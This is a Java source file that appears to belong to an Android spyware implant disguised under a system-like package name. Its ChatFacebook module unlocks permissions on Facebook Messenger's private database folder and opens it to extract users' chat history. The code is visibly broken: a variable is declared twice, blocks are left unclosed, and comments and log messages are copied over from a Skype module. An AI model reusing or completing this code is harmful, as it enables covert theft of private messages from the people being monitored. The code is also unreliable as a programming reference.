package com.android.networking.module.chat;

import java.io.File;
import java.io.IOException;
import java.util.Date;
import java.util.Hashtable;
import java.util.concurrent.Semaphore;

import com.android.networking.Messages;
import com.android.networking.auto.Cfg;
import com.android.networking.db.GenericSqliteHelper;
import com.android.networking.file.Path;
import com.android.networking.util.Check;

public class ChatFacebook extends SubModuleChat {

	private static final String TAG = "ChatFacebook";

	private static final int PROGRAM = 0x02;
	String pObserving = "facebook";

	private Date lastTimestamp;

	private Hashtable<String, Long> lastFb;
	Semaphore readChatSemaphore = new Semaphore(1, true);


	@Override
	public int getProgramId() {
		return PROGRAM;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram() {
		try {
			readFbMessageHistory();
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notifyStopProgram) Error: " + e);
			}
		}
	}

	@Override
	protected void start() {
		lastFb = markup.unserialize(new Hashtable<String, Long>());
		try {
			readFbMessageHistory();
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notifyStopProgram) Error: " + e);
			}
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (start), read lastSkype: " + lastFb);
		}
	}

	@Override
	protected void stop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stop), ");
		}
	}

	private void readFbMessageHistory() throws IOException{
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readChatMessages)");
		}

		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readSkypeMessageHistory), semaphore red");
			}
			return;
		}
		try {
			boolean updateMarkup = false;

			// k_0=/data/data/com.skype.raider/files
			//String dbDir = Messages.getString("k_0");
			String dbDir = "/data/data/com.facebook.orca/databases";
			String dbFile = "users_db2";
			Path.unprotect(dbDir, true);

			String account = readAccount();
			if (account == null || account.length() == 0)
				return;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (readSkypeMessageHistory) account: " + account);
			}
			// k_1=/main.db
			String dbFile = dbDir + "/" + account + Messages.getString("k_1");

			Path.unprotect(dbDir + "/" + account, true);
			Path.unprotect(dbFile, true);
			Path.unprotect(dbFile + "-journal", true);

			File file = new File(dbFile);

			if (file.canRead()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readSkypeMessageHistory): can read DB");
				}

				GenericSqliteHelper helper = GenericSqliteHelper.open(dbFile);
	}


}
